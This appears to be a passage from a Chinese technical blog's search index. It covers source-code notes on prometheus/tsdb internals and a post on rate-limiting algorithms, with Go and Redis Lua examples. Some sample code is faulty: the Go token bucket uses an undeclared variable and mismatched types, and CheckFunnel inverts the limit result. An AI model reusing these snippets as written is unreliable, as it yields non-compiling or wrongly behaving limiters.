缓存下来, 具体效果, 待阅读其他代码.\n\n```go\n// BufferedSeriesIterator wraps an iterator with a look-back buffer.\ntype BufferedSeriesIterator struct {\n    it  tsdb.SeriesIterator\n    buf *sampleRing\n\n    lastTime int64\n}\n\n// NewBuffer returns a new iterator that buffers the values within the time range\n// of the current element and the duration of delta before.\n// BufferedSeriesIterator 的作用是对上层 Iter 进行封装\n// 将其中最多 delta 时间范围内的数据点通过 sampleRing 缓存下来\nfunc NewBuffer(it tsdb.SeriesIterator, delta int64) *BufferedSeriesIterator {\n    return &BufferedSeriesIterator{\n        it:       it,\n        buf:      newSampleRing(delta, 16),\n        lastTime: math.MinInt64,\n    }\n}\n```\n\nSeek\n\n```go\n// Seek advances the iterator to the element at time t or greater.\n// 这里的 `指针` 只会向后移动, 不会向前\nfunc (b *BufferedSeriesIterator) Seek(t int64) bool {\n    t0 := t - b.buf.delta\n\n    // If the delta would cause us to seek backwards, preserve the buffer\n    // and just continue regular advancement while filling the buffer on the way.\n    // 此时 sampleRing 中的点都会失效, 因此直接重置\n    if t0 > b.lastTime {\n        b.buf.reset()\n\n        ok := b.it.Seek(t0)\n        if !ok {\n            return false\n        }\n        b.lastTime, _ = b.At()\n    }\n\n    if b.lastTime >= t {\n        return true\n    }\n    for b.Next() {\n        if b.lastTime >= t {\n            return true\n        }\n    }\n\n    return false\n}\n```\n\n#### tombstones.go\n\nStone:\n\nStone 是作为删除数据的标记\n\n```go\n// Stone holds the information on the posting and time-range\n// that is deleted.\ntype Stone struct {\n    ref       uint64\n    intervals Intervals\n}\n```\n\n##### Interval, Intervals\n\n用来记录时间段\n\n```go\n// Interval represents a single time-interval.\ntype Interval struct {\n    Mint, Maxt int64\n}\n\nfunc (tr Interval) inBounds(t int64) bool {\n    return t >= tr.Mint && t <= tr.Maxt\n}\n\nfunc (tr Interval) isSubrange(dranges Intervals) bool {\n    for _, r := range dranges {\n        if r.inBounds(tr.Mint) && r.inBounds(tr.Maxt) {\n            return true\n        }\n    }\n\n    return false\n}\n```\n\n##### TombstoneReader\n\n```go\n// TombstoneReader gives access to tombstone intervals by series reference.\ntype TombstoneReader interface {\n    // Get returns deletion intervals for the series with the given reference.\n    Get(ref uint64) (Intervals, error)\n\n    // Iter calls the given function for each encountered interval.\n    Iter(func(uint64, Intervals) error) error\n\n    // Close any underlying resources\n    Close() error\n}\n```\n\n提供了一个内存版的实现\n\n```go\ntype memTombstones map[uint64]Intervals\n\nvar emptyTombstoneReader = memTombstones{}\n\n// EmptyTombstoneReader returns a TombstoneReader that is always empty.\nfunc EmptyTombstoneReader() TombstoneReader {\n    return emptyTombstoneReader\n}\n\nfunc (t memTombstones) Get(ref uint64) (Intervals, error) {\n    return t[ref], nil\n}\n\nfunc (t memTombstones) Iter(f func(uint64, Intervals) error) error {\n    for ref, ivs := range t {\n        if err := f(ref, ivs); err != nil {\n            return err\n        }\n    }\n    return nil\n}\n\nfunc (t memTombstones) add(ref uint64, itv Interval) {\n    t[ref] = t[ref].add(itv)\n}\n\nfunc (memTombstones) Close() error {\n    return nil\n}\n```\n\nTombstoneReader 的内容可以被写入文件, 也可以通过文件读出.\n\n```go\nfunc writeTombstoneFile(dir string, tr TombstoneReader) error {\n    path := filepath.Join(dir, tombstoneFilename)\n    tmp := path + \".tmp\"\n    \n    // ...\n\n    return renameFile(tmp, path)\n}\n\nfunc readTombstones(dir string) (memTombstones, error) {\n    b, err := ioutil.ReadFile(filepath.Join(dir, tombstoneFilename))\n    // ...\n\n    stonesMap := memTombstones{}\n\n    for d.len() > 0 {\n        // ...\n        stonesMap.add(k, Interval{mint, maxt})\n    }\n\n    return stonesMap, nil\n}\n```\n\n#### wal.go\n\nprometheus/tsdb 会将几类数据先写入 wal (write ahead log) 文件\n\n```go\n// WALEntryType indicates what data a WAL entry contains.\ntype WALEntryType uint8\n\n// Entry types in a segment file.\nconst (\n    WALEntrySymbols WALEntryType = 1\n    WALEntrySeries  WALEntryType = 2\n    WALEntrySamples WALEntryType = 3\n    WALEntryDeletes WALEntryType = 4\n)\n\n// WAL is a write ahead log that can log new series labels and samples.\n// It must be completely read before new entries are logged.\ntype WAL interface {\n    Reader() WALReader\n    LogSeries([]RefSeries) error\n    LogSamples([]RefSample) error\n    LogDeletes([]Stone) error\n    Truncate(mint int64, keep func(uint64) bool) error\n    Close() error\n}\n\n// WALReader reads entries from a WAL.\ntype WALReader interface {\n    Read(\n        seriesf func([]RefSeries),\n        samplesf func([]RefSample),\n        deletesf func([]Stone),\n    ) error\n}\n```\n\n与之相关的数据结构定义如下\n\n```go\n// RefSeries is the series labels with the series ID.\ntype RefSeries struct {\n    Ref    uint64\n    Labels labels.Labels\n}\n\n// RefSample is a timestamp/value pair associated with a reference to a series.\ntype RefSample struct {\n    Ref uint64\n    T   int64\n    V   float64\n\n    // 基于内存的 series 数据, 在后续的阅读中再仔细分析\n    series *memSeries\n}\n```\n\n##### SegmentWAL\n\n这是 WAL 的一个实现, 会将数据切成 256MB 一片进行存储, 切片的组织方式与 chunks 类似.\n\n相应的, 操作文件的相关实现代码也很相似.\n\n```go\n// segmentFile wraps a file object of a segment and tracks the highest timestamp\n// it contains. During WAL truncating, all segments with no higher timestamp than\n// the truncation threshold can be compacted.\ntype segmentFile struct {\n    *os.File\n    maxTime   int64  // highest tombstone or sample timpstamp in segment\n    minSeries uint64 // lowerst series ID in segment\n}\n\n// SegmentWAL is a write ahead log for series data.\ntype SegmentWAL struct {\n    mtx     sync.Mutex\n    metrics *walMetrics\n\n    dirFile *os.File\n    files   []*segmentFile\n\n    logger        log.Logger\n    flushInterval time.Duration\n    segmentSize   int64\n\n    crc32 hash.Hash32\n    cur   *bufio.Writer\n    curN  int64\n\n    // 信号\n    stopc   chan struct{}\n    donec   chan struct{}\n    \n    // 后台执行的操作\n    actorc  chan func() error // sequentialized background operations\n    \n    buffers sync.Pool\n}\n```\n\n###### LogXXXX\n\nLogSeries, LogSamples, LogDeletes 对各自的操作数据分别编码写入 WAL.\n\n###### Truncate\n\n```go\n// Truncate deletes the values prior to mint and the series which the keep function\n// does not indiciate to preserve.\n// 用于清除不再需要的数据\nfunc (w *SegmentWAL) Truncate(mint int64, keep func(uint64) bool) error {\n    // ...\n\n    return nil\n}\n```\n\n###### run\n\n通过 `OpenSegmentWAL` 打开一个 SegmentWAL 的时候, 会在一个独立的 goroutine 中运行 run 函数, 用来处理 `actorc` 传递的后台操作.\n\n目前 `actorc` 传递的操作仅有文件的分片\n\n```go\n// cut finishes the currently active segments and opens the next one.\n// The encoder is reset to point to the new segment.\nfunc (w *SegmentWAL) cut() error {\n    // Sync current head to disk and close.\n    if hf := w.head(); hf != nil {\n        if err := w.flush(); err != nil {\n            return err\n        }\n        \n        // Finish last segment asynchronously to not block the WAL moving along\n        // in the new segment.\n        // 结束当前的切片文件\n        go func() {\n            w.actorc <- func() error {\n                off, err := hf.Seek(0, os.SEEK_CUR)\n                if err != nil {\n                    return errors.Wrapf(err, \"finish old segment %s\", hf.Name())\n                }\n                if err := hf.Truncate(off); err != nil {\n                    return errors.Wrapf(err, \"finish old segment %s\", hf.Name())\n                }\n                if err := hf.Sync(); err != nil {\n                    return errors.Wrapf(err, \"finish old segment %s\", hf.Name())\n                }\n                if err := hf.Close(); err != nil {\n                    return errors.Wrapf(err, \"finish old segment %s\", hf.Name())\n                }\n                return nil\n            }\n        }()\n    }\n\n    // 初始化新的切片文件供写入\n    // ...\n    \n    return nil\n}\n```\n\n\n\n#### Compact.go\n\n对底层存储的压缩相关的实现\n\n```go\n// Compactor provides compaction against an underlying storage\n// of time series data.\ntype Compactor interface {\n    // Plan returns a set of non-overlapping directories that can\n    // be compacted concurrently.\n    // Results returned when compactions are in progress are undefined.\n    Plan(dir string) ([]string, error)\n\n    // Write persists a Block into a directory.\n    Write(dest string, b BlockReader, mint, maxt int64) (ulid.ULID, error)\n\n    // Compact runs compaction against the provided directories. Must\n    // only be called concurrently with results of Plan().\n    Compact(dest string, dirs ...string) (ulid.ULID, error)\n}\n```\n\n##### LeveledCompactor\n\n是 Compactor 的实现\n\n###### Plan\n\n```go\n// Plan returns a list of compactable blocks in the provided directory.\nfunc (c *LeveledCompactor) Plan(dir string) ([]string, error) {\n    dirs, err := blockDirs(dir)\n    \n    // ...\n  \n    var dms []dirMeta\n\n    for _, dir := range dirs {\n        // 读取 BlockMeta 作为判断是否可以 compact 的依据\n        meta, err := readMetaFile(dir)\n        \n        // ...\n    }\n    return c.plan(dms)\n}\n```\n\n###### populateBlock\n\n`LeveledCompactor.Write` 和 `LeveledCompactor.Compact` 两个方法中都用到 `LeveledCompactor.write`, 而 `LeveledCompactor.populateBlock` 是 write 方法的重要逻辑.\n\n其作用是将一组 Block 的数据合并, 再写入 IndexWriter, ChunkWriter.\n\n```go\n\n// populateBlock fills the index and chunk writers with new data gathered as the union\n// of the provided blocks. It returns meta information for the new block.\nfunc (c *LeveledCompactor) populateBlock(blocks []BlockReader, meta *BlockMeta, indexw IndexWriter, chunkw ChunkWriter) error {\n    var (\n        set        ChunkSeriesSet\n        allSymbols = make(map[string]struct{}, 1<<16)\n        closers    = []io.Closer{}\n    )\n    defer func() { closeAll(closers...) }()\n\n    // 遍历旧 block 数据\n    for i, b := range blocks {\n        indexr, err := b.Index()\n        // ...\n\n        chunkr, err := b.Chunks()\n        // ...\n\n        tombsr, err := b.Tombstones()\n        // ...\n\n        symbols, err := indexr.Symbols()\n        // ...\n\n        all, err := indexr.Postings(index.AllPostingsKey())\n        if err != nil {\n            return err\n        }\n        all = indexr.SortedPostings(all)\n\n        s := newCompactionSeriesSet(indexr, chunkr, tombsr, all)\n\n        // ...\n      \n        // 与上一层并形成一个新的 merger\n        set, err = newCompactionMerger(set, s)\n        if err != nil {\n            return err\n        }\n    }\n\n    // We fully rebuild the postings list index from merged series.\n    // ...\n\n    // 遍历 merger\n    for set.Next() {\n        lset, chks, dranges := set.At() // The chunks here are not fully deleted.\n\n        // Skip the series with all deleted chunks.\n        // ...\n\n        if err := chunkw.WriteChunks(chks...); err != nil {\n            return errors.Wrap(err, \"write chunks\")\n        }\n\n        if err := indexw.AddSeries(i, lset, chks...); err != nil {\n            return errors.Wrap(err, \"add series\")\n        }\n\n        // ...\n    }\n    \n    // ...\n\n    s := make([]string, 0, 256)\n    for n, v := range values {\n        // ...\n\n        if err := indexw.WriteLabelIndex([]string{n}, s); err != nil {\n            return errors.Wrap(err, \"write label index\")\n        }\n    }\n\n    for _, l := range postings.SortedKeys() {\n        if err := indexw.WritePostings(l.Name, l.Value, postings.Get(l.Name, l.Value)); err != nil {\n            return errors.Wrap(err, \"write postings\")\n        }\n    }\n    return nil\n}\n```\n\n#### block.go\n\n##### Block\n\n###### Delete\n\n```go\n// Delete matching series between mint and maxt in the block.\n// 前面说到, Delete 的时候会暂时先标记为 Tombstone, 这里即实现部分\nfunc (pb *Block) Delete(mint, maxt int64, ms ...labels.Matcher) error {\n    // ...\n\n    err = pb.tombstones.Iter(func(id uint64, ivs Intervals) error {\n        for _, iv := range ivs {\n            stones.add(id, iv)\n            pb.meta.Stats.NumTombstones++\n        }\n        return nil\n    })\n    if err != nil {\n        return err\n    }\n    pb.tombstones = stones\n\n    if err := writeTombstoneFile(pb.dir, pb.tombstones); err != nil {\n        return err\n    }\n    return writeMetaFile(pb.dir, &pb.meta)\n}\n```\n\n**CleanTombstones**\n\n```go\n// CleanTombstones will rewrite the block if there any tombstones to remove them\n// and returns if there was a re-write.\nfunc (pb *Block) CleanTombstones(dest string, c Compactor) (bool, error) {\n    numStones := 0\n\n    pb.tombstones.Iter(func(id uint64, ivs Intervals) error {\n        for _ = range ivs {\n            numStones++\n        }\n\n        return nil\n    })\n\n    if numStones == 0 {\n        return false, nil\n    }\n\n    if _, err := c.Write(dest, pb, pb.meta.MinTime, pb.meta.MaxTime); err != nil {\n        return false, err\n    }\n\n    return true, nil\n}\n```\n\n###### Snapshot\n\n疑问, 这里仅对目标文件夹及其内部文件做了 hardlink, 怎么确保内容不变?\n\n#### head.go\n\n##### Head\n\nHead 向调用方提供, 用于某个时间段内的数据读写.\n\nHead 会同时处理 WAL 内的和已经持久化的数据.\n\nHead 可以认为是`current Block`\n\n所有 Block 不可再写入, Head 在写入有效期过后会转化为 Block 进行持久化.\n\n###### Appender\n\n```go\n// Appender returns a new Appender on the database.\n// 会根据具体情形决定返回的 Appender 实例\n// Appender 实例共两类\n// initAppender 会在接收到第一个数据点时初始化 Head 的起始时间\n// headAppender 逻辑相对简单\nfunc (h *Head) Appender() Appender {\n    h.metrics.activeAppenders.Inc()\n\n    // The head cache might not have a starting point yet. The init appender\n    // picks up the first appended timestamp as the base.\n    if h.MinTime() == math.MinInt64 {\n        return &initAppender{head: h}\n    }\n    return h.appender()\n}\n\nfunc (h *Head) appender() *headAppender {\n    return &headAppender{\n        head:          h,\n        mint:          h.MaxTime() - h.chunkRange/2,\n        samples:       h.getAppendBuffer(),\n        highTimestamp: math.MinInt64,\n    }\n}\n```\n\n#### querier.go\n\n围绕以下三个接口, 向调用方提供查询能力.\n\n```go\n// Querier provides querying access over time series data of a fixed\n// time range.\ntype Querier interface {\n    // Select returns a set of series that matches the given label matchers.\n    Select(...labels.Matcher) (SeriesSet, error)\n\n    // LabelValues returns all potential values for a label name.\n    LabelValues(string) ([]string, error)\n    // LabelValuesFor returns all potential values for a label name.\n    // under the constraint of another label.\n    LabelValuesFor(string, labels.Label) ([]string, error)\n\n    // Close releases the resources of the Querier.\n    Close() error\n}\n\n// Series exposes a single time series.\ntype Series interface {\n    // Labels returns the complete set of labels identifying the series.\n    Labels() labels.Labels\n\n    // Iterator returns a new iterator of the data of the series.\n    Iterator() SeriesIterator\n}\n\n// SeriesSet contains a set of series.\ntype SeriesSet interface {\n    Next() bool\n    At() Series\n    Err() error\n}\n```\n\n##### querier, blockQuerier\n\nblockQuerier 是针对一个 block 的 Querier\n\nquerier 是 blockQuerier 的聚合\n\n#### db.go\n\n##### Appender\n\nAppender 是写入接口, *Head 就实现了 Appender\n\n```go\n// Appender allows appending a batch of data. It must be completed with a\n// call to Commit or Rollback and must not be reused afterwards.\n//\n// Operations on the Appender interface are not goroutine-safe.\ntype Appender interface {\n    // Add adds a sample pair for the given series. A reference number is\n    // returned which can be used to add further samples in the same or later\n    // transactions.\n    // Returned reference numbers are ephemeral and may be rejected in calls\n    // to AddFast() at any point. Adding the sample via Add() returns a new\n    // reference number.\n    // If the reference is the empty string it must not be used for caching.\n    Add(l labels.Labels, t int64, v float64) (uint64, error)\n\n    // Add adds a sample pair for the referenced series. It is generally faster\n    // than adding a sample by providing its full label set.\n    AddFast(ref uint64, t int64, v float64) error\n\n    // Commit submits the collected samples and purges the batch.\n    Commit() error\n\n    // Rollback rolls back all modifications made in the appender so far.\n    Rollback() error\n}\n```\n\n##### DB\n\nDB 是向调用者提供的最主要的结构体.\n\n```go\n// DB handles reads and writes of time series falling into\n// a hashed partition of a seriedb.\ntype DB struct {\n    dir   string\n    lockf *lockfile.Lockfile\n\n    logger    log.Logger\n    metrics   *dbMetrics\n    opts      *Options\n    chunkPool chunkenc.Pool\n    compactor Compactor\n\n    // Mutex for that must be held when modifying the general block layout.\n    mtx    sync.RWMutex\n    blocks []*Block\n\n    head *Head\n\n    compactc chan struct{}\n    donec    chan struct{}\n    stopc    chan struct{}\n\n    // cmtx is used to control compactions and deletions.\n    cmtx               sync.Mutex\n    compactionsEnabled bool\n}\n```\n\n**reload**\n\n```go\n// reload on-disk blocks and trigger head truncation if new blocks appeared. It takes\n// a list of block directories which should be deleted during reload.\nfunc (db *DB) reload(deleteable ...string) (err error) {\n    // ...\n    \n    // 读取当前所有的 block 目录\n    dirs, err := blockDirs(db.dir)\n    \n    // ...\n    \n    var (\n        blocks []*Block\n        exist  = map[ulid.ULID]struct{}{}\n    )\n\n    for _, dir := range dirs {\n        meta, err := readMetaFile(dir)\n        \n        // ...\n\n        // 尝试获取目录对应的 Block, 先从内存, 再从硬盘\n        b, ok := db.getBlock(meta.ULID)\n        if !ok {\n            b, err = OpenBlock(dir, db.chunkPool)\n            \n            // ...\n        }\n\n        blocks = append(blocks, b)\n        exist[meta.ULID] = struct{}{}\n    }\n\n    // 按照 Block 覆盖的时间重新排序\n    if err := validateBlockSequence(blocks); err != nil {\n        return errors.Wrap(err, \"invalid block sequence\")\n    }\n\n    // ...\n    \n    // 清除不必要的 Block 文件\n    for _, b := range oldBlocks {\n        if _, ok := exist[b.Meta().ULID]; ok {\n            continue\n        }\n        if err := b.Close(); err != nil {\n            level.Warn(db.logger).Log(\"msg\", \"closing block failed\", \"err\", err)\n        }\n        if err := os.RemoveAll(b.Dir()); err != nil {\n            level.Warn(db.logger).Log(\"msg\", \"deleting block failed\", \"err\", err)\n        }\n    }\n\n    // Garbage collect data in the head if the most recent persisted block\n    // covers data of its current time range.\n    if len(blocks) == 0 {\n        return nil\n    }\n    maxt := blocks[len(blocks)-1].Meta().MaxTime\n\n    return errors.Wrap(db.head.Truncate(maxt), \"head truncate failed\")\n}\n```\n\n###### run\n\nrun 方法在 Open 时被调用, 在一个单独的 goroutine 中执行, 主要是定期对数据进行压缩以节省空间\n\n```go\nfunc (db *DB) run() {\n    defer close(db.donec)\n\n    backoff := time.Duration(0)\n\n    for {\n        select {\n        case <-db.stopc:\n            return\n        case <-time.After(backoff):\n        }\n\n        select {\n        case <-time.After(1 * time.Minute):\n            select {\n            case db.compactc <- struct{}{}:\n            default:\n            }\n        case <-db.compactc:\n            // 执行压缩相关代码\n\n        case <-db.stopc:\n            return\n        }\n    }\n}\n```\n\n###### Appender\n\n返回的是封装的结果 dbAppender, 后面专门再分析\n\n###### Qurier\n\n返回的是所有指定时间范围内的 Block 聚合\n\n```go\n// Querier returns a new querier over the data partition for the given time range.\n// A goroutine must not handle more than one open Querier.\nfunc (db *DB) Querier(mint, maxt int64) (Querier, error) {\n    var blocks []BlockReader\n\n    db.mtx.RLock()\n    defer db.mtx.RUnlock()\n\n    for _, b := range db.blocks {\n        m := b.Meta()\n        \n        // 找出符合时间段的 block\n        if intervalOverlap(mint, maxt, m.MinTime, m.MaxTime) {\n            blocks = append(blocks, b)\n        }\n    }\n    \n    // 前面提到, Head 可以视作当前 Block\n    if maxt >= db.head.MinTime() {\n        blocks = append(blocks, db.head)\n    }\n\n    // Block 的聚合\n    sq := &querier{\n        blocks: make([]Querier, 0, len(blocks)),\n    }\n    for _, b := range blocks {\n        q, err := NewBlockQuerier(b, mint, maxt)\n        if err == nil {\n            sq.blocks = append(sq.blocks, q)\n            continue\n        }\n        // If we fail, all previously opened queriers must be closed.\n        for _, q := range sq.blocks {\n            q.Close()\n        }\n        return nil, errors.Wrapf(err, \"open querier for block %s\", b)\n    }\n    return sq, nil\n}\n```\n\n###### Delete\n\n这边实际会将 Delete 操作分给各个受影响的 Block\n\n###### CleanTombstone\n\n前面提到, 各个 Block Delete 内的逻辑实际是写 WAL 以及 Tombstone 文件\n\n这里会对当前所有 Block 真正进行清理, 然后调用 `reload` 方法.\n\n##### dbAppender\n\n是对 *headAppender 的封装, 在 Commit 的时候触发 compact\n\n```go\n// Appender opens a new appender against the database.\nfunc (db *DB) Appender() Appender {\n    return dbAppender{db: db, Appender: db.head.Appender()}\n}\n\n// dbAppender wraps the DB's head appender and triggers compactions on commit\n// if necessary.\ntype dbAppender struct {\n    Appender\n    db *DB\n}\n\nfunc (a dbAppender) Commit() error {\n    err := a.Appender.Commit()\n\n    // We could just run this check every few minutes practically. But for benchmarks\n    // and high frequency use cases this is the safer way.\n    if a.db.head.MaxTime()-a.db.head.MinTime() > a.db.head.chunkRange/2*3 {\n        select {\n        case a.db.compactc <- struct{}{}:\n        default:\n        }\n    }\n    return err\n}\n```\n\n#### Summary\n\n`prometheus/tsdb`  (下称 ptsdb ) 的结构体之间的层次大概可以这样划分:\n\n- DB: 对外提供的核心对象\n  - Block 已经持久化的, 覆盖某个时间段的时序数据. Block 的 \n    - Index: 用于保存 labels 的索引数据\n    - Chunk: 用于保存时间戳-采样值 数据\n\n- Head: 由于 ptsdb 规定, 数据必须增序写入, 已经持久化的 Block 不能再写入, 因此一个时刻只会有一个可供写入的 Block, 即 Head. Head 同时还承担记录删除动作的任务 \n  - WAL 增删改的动作都会先进入 WAL, 供后续恢复用\n  - Tombstone: 用于标记删除动作, 被标记的数据在 compact 的时候统一清理\n- Compactor: 对文件进行压缩. Block 数据的组织参考了 LSM, 因此 Compactor 的实现也和基于 LSM 的 kv db 类似.\n\n关于 ptsdb, [时间序列数据的存储和计算 - 开源时序数据库解析（四）](https://link.jianshu.com?t=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F32900004) 这篇文章有更宏观的阐述, 可以参考.\n\n\n\n## 参考资料\n\nhttps://zhuanlan.zhihu.com/p/60212547\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["tsdb"],"categories":["tsdb"]},{"title":"分布式限流算法","url":"/2020/09/29/分布式限流算法/","content":"\n\n\n## 分布式限流算法\n\n### 介绍\n\n介绍汇总一些常用到的限流算法和代码实现。方便后续开发使用。常用的限流算法： 计数器，令牌桶，漏桶。\n\n### 计数器算法\n\n采用计数器实现限流有点简单粗暴，一般我们会限制一秒钟的能够通过的请求数，比如限流qps为100，算法的实现思路就是从第一个请求进来开始计时，在接下去的1s内，每来一个请求，就把计数加1，如果累加的数字达到了100，那么后续的请求就会被全部拒绝。等到1s结束后，把计数恢复成0，重新开始计数。\n\n具体的实现可以是这样的：对于每次服务调用，可以通过 `AtomicLong#incrementAndGet()`方法来给计数器加1并返回最新值，通过这个最新值和阈值进行比较。\n\n### 漏桶算法\n\n为了消除\"突刺现象\"，可以采用漏桶算法实现限流，漏桶算法这个名字就很形象，算法内部有一个容器，类似生活用到的漏斗，当请求进来时，相当于水倒入漏斗，然后从下端小口慢慢匀速的流出。不管上面流量多大，下面流出的速度始终保持不变。\n\n在算法实现方面，可以准备一个队列，用来保存请求，另外通过一个线程池定期从队列中获取请求并执行，可以一次性获取多个并发执行。\n\n这种算法，在使用过后也存在弊端：无法应对短时间的突发流量。\n\n### 令牌桶\n\n令牌桶算法是对漏桶算法的一种改进，桶算法能够限制请求调用的速率，而令牌桶算法能够在限制调用的平均速率的同时还允许一定程度的突发调用。\n\n在令牌桶算法中，存在一个桶，用来存放固定数量的令牌。算法中存在一种机制，以一定的速率往桶中放令牌。每次请求调用需要先获取令牌，只有拿到令牌，才有机会继续执行，否则选择选择等待可用的令牌、或者直接拒绝。\n\n放令牌这个动作是持续不断的进行，如果桶中令牌数达到上限，就丢弃令牌，所以就存在这种情况，桶中一直有大量的可用令牌，这时进来的请求就可以直接拿到令牌执行，比如设置qps为100，那么限流器初始化完成一秒后，桶中就已经有100个令牌了，这时服务还没完全启动好，等启动完成对外提供服务时，该限流器可以抵挡瞬时的100个请求。所以，只有桶中没有令牌时，请求才会进行等待，最后相当于以一定的速率执行。\n\n实现思路：可以准备一个队列，用来保存令牌，另外通过一个线程池定期生成令牌放到队列中，每来一个请求，就从队列中获取一个令牌，并继续执行。\n\n```go\ntype RateLimiter struct {\n\tCapacity int64\n\tLeakingRate float64\n\tTokens int64\n\tLastLeakTime int64\n}\n\nfunc (rl *RateLimiter) Allow() bool {\n\tnow := time.Now().Unix()\n\n\tsupplyToken = rl.Tokens + (now - rl.LastLeakTime) * rl.LeakingRate\n\trl.Tokens = min(rl.Capacity, supplyToken)\n\trl.LastLeakTime = now\n\n\tif rl.Tokens > 1 {\n\t\t\trl.Tokens--\n\t\t\treturn true\n\t}\n\treturn false\n}\n```\n\n\n\n### 集群限流\n\n为了控制访问次数，肯定需要一个计数器，而且这个计数器只能保存在第三方服务，比如redis。\n\n每次有相关操作的时候，就向redis服务器发送一个incr命令，比如需要限制某个用户访问/index接口的次数，只需要拼接用户id和接口名生成redis的key，每次该用户访问此接口时，只需要对这个key执行incr命令，在这个key带上过期时间，就可以实现指定时间的访问频率。\n\nredis + lua实现:\n\nlua脚本：\n\n```lua\n--- 获取令牌桶\nlocal funnel = redis.call(\"HMGET\", KEYS[1], 'capacity', 'leaking_rate', 'tokens', 'subfunnel_capacity', 'subfunnel_rate', 'last_leak_time')\n\n--- 没有拿到限流配置，放行\nif funnel[1] == nil then\n\treturn 0\nend\n\nlocal capacity = tonumber(funnel[1])            ---  capacity 容量\nlocal leaking_rate = tonumber(funnel[2])        ---  leaking_rate 令牌桶添加令牌速率\nlocal tokens = tonumber(funnel[3])              ---  tokens 剩余容量\nlocal subfunnel_capacity = tonumber(funnel[4])  ---  subfunnel_capacity 子桶容量\nlocal subfunnel_rate = tonumber(funnel[5])      ---  subfunnel_rate 子桶添加令牌速率\nlocal last_leak_time = tonumber(funnel[6])      ---  last_leak_time 最后访问时间戳\n\n--- 容量小于等于0，放行\nif (capacity <= 0) then\n\treturn 0\nend\n\nlocal now = tonumber(ARGV[1])              --- 获取时间戳\nlocal subfunnel_name = ARGV[2]             --- 获取限流子桶Name\nlocal req_token = tonumber(ARGV[3])        --- 请求获取令牌数量\n\n--- 计算需要补充的令牌\nlocal supply_token = (now - last_leak_time) * leaking_rate\nif (supply_token > 0) then\n\tlast_leak_time = now\n\ttokens = math.min(supply_token + tokens, capacity)\nend\n\nlocal result = 1 --- 默认不能取得令牌\n\n--- 判断总桶\nif (tokens >= req_token) then\n\tresult = 0\n\n--- 判断子桶\n\tif (string.len(subfunnel_name) > 0 and subfunnel_capacity > 0) then\n\t\tlocal subkey = KEYS[1]..\":subfunnel\"\n\t\tlocal free_field = subfunnel_name..':tokens'\n\t\tlocal last_field = subfunnel_name..':last_leak_time'\n\n\t\tlocal subfunnel = redis.pcall('HMGET', subkey, free_field, last_field)\n\t\tlocal sub_free, sub_last = subfunnel_capacity, now\n\n\t\tif (subfunnel[1]) then\n\t\t\tsub_free = tonumber(subfunnel[1])\n\t\tend\n\t\tif (subfunnel[2]) then\n\t\t\tsub_last = tonumber(subfunnel[2])\n\t\tend\n\t\t\n\t\tlocal sub_supply = (now - sub_last) * subfunnel_rate  --- 计算子桶补充令牌数\n\t\tif (sub_supply > 0) then\n\t\t\tsub_last = now\n\t\t\tsub_free = math.min(sub_supply + sub_free, subfunnel_capacity)\n\t\tend\n\n\t\tif (sub_free >= req_token) then\n\t\t\tsub_free = sub_free - req_token\n\t\t\ttokens = tokens - req_token\n\t\telse\n\t\t\tresult = 2\n\t\tend\n\n\t\tredis.pcall('HMSET', subkey, free_field, sub_free, last_field, sub_last)  --- 更新子桶\n\telse\n\t\ttokens = tokens - req_token\n\tend\nend\n\nredis.call('HMSET', KEYS[1], \"last_leak_time\", last_leak_time, \"tokens\", tokens)  --- 更新桶\n\nreturn last_leak_time * 10 + result\n```\n\ngo\n\n```go\nfunc CheckFunnel(client *redis.Client, key string, subFunnel string, count int) (reqTime int64, isLimit bool, err error) {\n\treqTime = MakeTimestamp()\n\t// applyToken is *redis.Script\n\tres, err := applyToken.Run(client, []string{key}, reqTime, subFunnel, count).Int64()\n\n\tif err != nil {\n\t\treturn reqTime, false, err\n\t}\n\n\tretCode := res % 10\n\tisLimit = bool(retCode == 0)\n\n\tswitch retCode {\n\t// case retCode and set err\n\tcase 0:\n\t\terr = nil\n\t}\n\n\treturn\n}\n\nfunc Allow(client *redis.Client, key string, subFunnel string) (isLimit bool) {\n\t_, isLimit, _ = CheckFunnel(client, key, subFunnel, 1)\n\treturn\n}\n```\n\n速率控制：\n\nMakeRate函数\n\n```go\nfunc MakeRate(capacity int64, duration time.Duration) float64 {\n\treturn float64(capacity) * float64(time.Millisecond) / float64(duration) // to req/ms\n}\n```\n\n传入当前时间\n\n```go\nfunc MakeTimestamp() int64 {\n\treturn time.Now().UnixNano() / int64(time.Millisecond)\n}\n```\n\n\n\n### srTCM和trTCM\n\n#### stTCM\n\nsrTCM的英文全称是Single Rate Three Color Marker，**单速率三颜色标记**\n\n需要预先设定三个参数：\n\n- Committed Information Rate(CIR)，提交信息率。\n- Committed Burst Size(CBS)，提交Burst大小。\n- Excess Burst Size(EBS)，超量Burst大小。\n\nCIR用于表示每秒IP包的字节数，header包括在内\n\nCBS和EBS以字节为单位。必须被设置。推荐值：它们之一必须大于0，且若大于0的CBS和EBS，值要大于MTU。\n\n**颜色有三种：绿、黄、红**。简单来说，颜色与参数的对应关系是这样的：\n\n- 如果没有超过CBS就是绿的。\n- 超过了CBS但没有超过EBS就是黄的。\n- 超过了EBS就是红的。\n\n算法流程：\n\n```shell\n                +------------+\n                |   Result   |\n                |            V\n            +-------+    +--------+\n            |       |    |        |\nPacket Stream ===>| Meter |===>| Marker |===> Marked Stream\n            |       |    |        |\n            +-------+    +--------+\n```\n\nMeter（限速器）用于限速\n\nMarker收到的是每一个packet和其对应的结果值，根据计算结果在所有packet的IP header的DS field中标记上不同的“颜色”\n\nMeter 使用两个令牌桶实现。\n\nMeter有两种工作模式：色盲模式，非色盲模式\n\n如果工作在**色盲模式**下，且大小为B字节的包在t时间到达，算法工作如下：若令牌桶C足以让B通过，则tag此包为绿色，并减去对应的Tc；若C不足以让B通过而E足以让B通过，则tag此包为黄色，并减去对应的Te；否则tag此包为红色。\n\n如果工作在**非色盲模式**下，大小为B字节的包在t时间到达，算法工作如下：若包先前tag成绿色，且令牌桶C足以让B通过，则此包依旧tag成绿色，减去对应的Tc；若令牌桶C不足以让B通过，且该包先前tag的是绿色或黄色，且令牌桶E足以让B通过，就tag成黄色，并减去对应的Te；否则（两种情况：先前此包tag成红色或令牌桶E不足以让B通过）tag为红色。\n\n#### tcTCM\n\nTwo Rate Three Color Marker ，**双速率三颜色标记**\n\n四个参数：\n\n1. Peak Information Rate (PIR)，峰值信息率。\n2. Peak Burst Size 